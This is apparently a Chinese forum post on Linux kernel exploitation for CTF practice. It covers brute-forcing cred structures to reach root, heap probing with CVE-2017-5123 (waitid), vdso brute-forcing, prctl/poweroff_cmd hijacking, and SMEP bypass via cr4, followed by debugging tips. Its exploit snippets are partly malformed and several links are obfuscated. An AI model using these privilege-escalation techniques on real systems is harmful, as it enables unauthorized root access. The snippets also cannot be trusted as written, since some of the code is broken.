
```
struct cred {
    atomic_t usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t subscribers; /* number of processes subscribed */
    void *put_addr;
    unsigned magic;
#define CRED_MAGIC 0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t uid; /* real UID of the task */
    kgid_t gid; /* real GID of the task */
    kuid_t suid; /* saved UID of the task */
    kgid_t sgid; /* saved GID of the task */
    kuid_t euid; /* effective UID of the task */
    kgid_t egid; /* effective GID of the task */
    kuid_t fsuid; /* UID for VFS ops */
    kgid_t fsgid; /* GID for VFS ops */
    unsigned securebits; /* SUID-less security management */
    kernel_cap_t cap_inheritable; /* caps our children can inherit */
    kernel_cap_t cap_permitted; /* caps we're permitted */
    kernel_cap_t cap_effective; /* caps we can actually use */
    kernel_cap_t cap_bset; /* capability bounding set */
    kernel_cap_t cap_ambient; /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char jit_keyring; /* default keyring to attach requested
                                 * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key *process_keyring; /* keyring private to this process */
    struct key *thread_keyring; /* keyring private to this thread */
    struct key *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void *security; /* subjective LSM security */
#endif
    struct user_struct *user; /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info; /* supplementary groups for euid/fsgid */
    struct rcu_head rcu; /* RCU deletion hook */
};
```

通过一个超级粗暴的`cred`爆破代码带大家看看`cred`的利用

当我们有了内存的任意读写权限之后

```
unsigned int credIt = 0;
unsigned int credNum = 0;
while
{
(((unsigned long)addr) < (mmapStart + size - 0x40))
credIt = 0;
if (
    addr[credIt++] == uid &&
    addr[credIt++] == uid &&
    addr[credIt++] == uid &&
    addr[credIt++] == uid &&
    addr[credIt++] == uid &&
    addr[credIt++] == uid &&
    addr[credIt++] == uid &&
    addr[credIt++] == uid
){
    credNum++;
    printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr,credNum);
    credIt = 0;
    addr[credIt++] = 0;
    addr[credIt++] = 0;
    addr[credIt++] = 0;
    addr[credIt++] = 0;
    addr[credIt++] = 0;
    addr[credIt++] = 0;
    addr[credIt++] = 0;
    addr[credIt++] = 0;
    if (getuid() == 0)
    {
        puts("[+] GOT ROOT!");
        break;
    }
}
else
{
    credIt = 0;
    addr[credIt++] = uid;
    addr[credIt++] = uid;
    addr[credIt++] = uid;
    addr[credIt++] = uid;
    addr[credIt++] = uid;
    addr[credIt++] = uid;
    addr[credIt++] = uid;
    addr[credIt++] = uid;
}
addr++
}
```

但是这种爆破需要时间太长了

前几天看到一篇文章

<mark class="encrypted">924K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4u0W2N6X3g2J5M7$3g2Q4x3X3g2H3N6i4c8Q4x3X3g2S2M7#2)9J5c8U0t1H3x3e0N6Q4x3V1j5I4x3g2)9J5c8U0l9%4i4K6u0r3k6i4S2H3L8r3!0A6N6r3W2F1k6#2)9J5k6r3y4$3k6g2)9J5k6o6t1H3x3e0N6Q4x3X3b7#2x3e0t1K6i4K6u0r3</mark>

利用`cve-2017-5123` `waitid`的漏洞 先进行内存堆探测，

`cve-2017-5123` 最最最基础利用可以看我前面的文章，

https://bbs.pediy.com/thread-247014.htm

感觉有必要做一个关于`cve-2017-5123`的专题，一个很适合练手的cve。

内核堆探测的代码：

```
for(i = (char *)0xffff880000000000; ; i+=0x10000000) {
    pid = fork();
    if (pid > 0)
    {
        if(syscall(__NR_waitid, P_PID, pid, (siginfo_t *)i, WEXITED, NULL) >= 0)
        {
            printf("[+] Found %pn", i);
            break;
        }
    }
    else if (pid == 0)
        exit(0);
}
```

`waitid`去任意写0，触发缺页异常并不会直接触发`OOPS`，但是会返回`fault`，这样就可以进行内存堆探测，只要能找到堆的大体位置，并且在上面通过`fork`，在堆上面分配大量`cred`结构，这样大大增加命中的几率。但是这里有一个困扰我多年的问题，那就是我找不到办法直接去调试`kernel heap`，希望大佬们能分享一些实用的工具。而且文章中给出的探测堆地址的代码中，为什么要以`0x10000000`为单位进行探测我始终不明白。准备接下来一段时间认真读一下`linux kernel heap`的源码，希望能有所解答。

# VMA结构

`vma`的利用我都发在了这篇文章上，不再重复了，大家可以复现一波，这个cve真的很有意思。

<mark class="encrypted">079K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0p5$3x3e0j5K6x3R3`.`.</mark>

# SMEP的绕过技术

## `vdso` overwrite

```
static int __init init_vdso_vars(void) {
    int npages = (vdso_end - vdso_start + PAGE_SIZE - 1) / PAGE_SIZE;
    int i;
    char *vbase;
    vdso_size = npages << PAGE_SHIFT;
    vdso_pages = kmalloc(sizeof(struct page *) * npages, GFP_KERNEL);
    if (!vdso_pages)
        goto oom;
    for (i = 0; i < npages; i++) {
        struct page *p;
        p = alloc_page(GFP_KERNEL);
        if (!p)
            goto oom;
        vdso_pages[i] = p;
        copy_page(page_address(p), vdso_start + i*PAGE_SIZE);
    }
    vbase = vmap(vdso_pages, npages, 0, PAGE_KERNEL);
```

`vdso`是以页为单位`copy`到内核地址空间的。如果可以内核地址任意的读，可以页为单位进行爆破`vdso`的地址。

```
void* header = 0;
void* loc = 0xffffffff80000000;
size_t i = 0;
for (; loc<0xffffffffffffafff; loc+=0x1000) {
    readMem(&header,loc,8);
    if (header==0x010102464c457f) {
        fprintf(stderr,"%p elf\n",loc);
        readMem(&header,loc+0x270,8);
        //Look for 'clock_ge' signature (may not be at this offset, but happened to be)
        if (header==0x65675f6b636f6c63) {
            fprintf(stderr,"%p found it?\n",loc);
            break;
        }
    }
}
```

这是`String IPC`的例子，首先找到有`ELF`头的一页，再看这页的偏移`0x270`的地方对不对。具体的情况可能这个偏移不一样，可以自行`dump vdso`找偏移进行测试。

有了`vdso`的地址，我们就可以进行`overwrites`

<a href="elink@efbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5j5i4u0V1k6h3&6W2k6r3I4A6L8Y4g2^5i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6@1M7X3q4F1M7$3I4S2N6r3W2G2L8W2)9J5c8U0t1H3x3e0g2Q4x3V1j5I4x3g2)9J5c8U0t1#2i4K6u0r3g2s2u0S2L8Y4y4D9j5i4c8A6L8$3&6Q4x3X3c8n7P5i4m8S2M7%4y4A6L8X3N6Q4x3X3c8e0e0f1g2b7i4K6u0V1g2i4y4A6L8X3N6Q4x3X3c8$3c8q4y4a6i4K6u0V1e0%4k6W2M7Y4N6J5K9i4c8W2M7#2)9J5k6h3S2@1L8h3H3`.">vdso overwrite技术</a>

## hijack `prctl`

强网杯`solid_core`里面用到的技术：

劫持`prctl`中的`hook`

32位参数不能直接劫持`call_usermoderhelper`，但是可以先劫持`poweroff_cmd`这个全局变量，为我们想要执行的命令。需要绕过`kaslr`。`kaslr`的`seed`为`0x100000`，爆破出`poweroff_cmd`.这里也是一种绕过`kaslr`的爆破技术，在通过在`ida`中找出`data`段`poweroff_cmd`的偏移，以`seed`为单位进行爆破。其实跟通过爆破`vdso`找出`kernel base`是一个道理。之后将`prctl`劫持为`orderly_poweroff`。这里不详细讲了，可以看出题人大佬的博客。

<mark class="encrypted">984K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4A6L8i4l9I4k6g2)9J5k6h3I4W2j5h3&6G2N6r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6H3L8%4y4@1i4K6u0r3i4K6t1#2c8e0g2Q4x3U0g2n7b7#2)9J5y4f1u0m8i4K6t1#2c8e0N6Q4x3U0g2n7c8q4)9J5y4e0V1I4i4K6t1#2c8e0k6Q4x3U0f1&6c8q4)9J5y4f1q4r3i4K6t1#2c8e0g2Q4x3U0f1^5y4#2)9J5y4f1u0m8i4K6t1#2c8e0W2Q4x3U0g2m8x3W2)9J5y4e0V1^5i4K6t1#2c8e0k6Q4x3U0f1^5x3q4)9J5y4e0W2p5i4K6t1#2c8e0S2Q4x3U0g2n7y4#2)9J5y4f1q4r3i4K6u0V1M7$3!0D9K9h3c8Q4y4h3k6U0L8%4u0W2</mark>

插一句，这个题我用`gdb`调试的时候，题目给的`vmlinux`没有`debug symbols table`，难受的一匹，我只能先在`qemu`中读出`kallsyms` 中`prctl`的地址，然后手动的下段点。之后找`hook`也是难受的一匹。不知道大佬们有什么好用的办法。

## write `cr4`

中规中矩的一种方法，当有了`kernelbase`之后，构造一个内核`rop`组成的`payload`，`write cr4`，但是这个需要一些辅助的利用条件，比如存在`ufa`，就可以利用`tty_struct`绕过`smep`。可以参考之前`tty_struct`的介绍。

# 最后再说一点自己调试过程中问题

因为使用`gdb`远程调试内核，所以我一直没找到什么有效的手段查看内核的内存映射。一般就是通过`readelf -a vmlinux`看看`text` `bss` `data`段的偏移，在`kallsyms`中看看`text`段符号表，有些全局变量在`ida`中找找偏移。但是内核的堆和栈，没有像用户态看起来那么方便。

在这里说一说自己调试的时候是怎么处理的。希望大佬们能跟我分享一下自己的调试技巧。每次做`kernel ctf pwn`都烦skr人，然后用一些`lowB`的方法，唉！

对于栈的话没什么，

`grep 0 /sys/module/yourmodule/sections/.text`

从`/sys/module`中找出`text`段位置，之后

`add-symbol-file ./yourmodule.ko 【address】`

加载你的驱动的符号表，之后下断点，`x/60gx $rsp`就可以看栈的情况。

但是堆的话比较难受，原因是对于内核堆的分配算法 `slub` `slab` 伙伴算法，我理解不深，也没有实际去调试过这种题型。做过的`ctf`题目都是有一个简单的`uaf`，释放一个堆块，马上将其再申请出来这种。在网上也找不到什么实用工具。

所以我写了一个很简单的小驱动，`kmalloc`一块地址，因为`slub`分配方法是 先通过伙伴系统获取一整页大小的虚拟内存，之后将整页分配成固定大小的内存块，根据`kmalloc`进行堆分配。所以，我想的是包装一个内核的模块，当我们要调试一个`kernel`的程序的时候，比如，需要申请一块`ttystruct`，`kmalloc(0x2e0)`,这个时候，我们先在包装的内核模块中`kmalloc`一块同样大小的地址，将这个地址输出，这样，我们要调试的这块`tty_struct`就会跟我们内核模块输出的地址在同一页中，方便我们去查看堆。

写完之后突然觉得自己是个智障一样，自己还以为是在做用户态的菜单程序，`malloc`之后的地址没法直接输出。内核态的利用`exp`不都是我们自己用`C`写的？自己`kmalloc`之后自己输出一下不就行了。调试起来难受的原因就是实践的少了，外加`kernel`源码理解不深。所以接下来一段时间可能会爆更一些`kernel` 的ctf题目和cve的复现，同时准备更新一些`kenerl`源码的阅读和调试技巧思考。

真心希望大佬们分享一波自己的调试经验

# 参考链接

<mark class="encrypted">0e4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0R3%4x3U0t1#2</mark>

https://bbs.pediy.com/thread-225488.htm
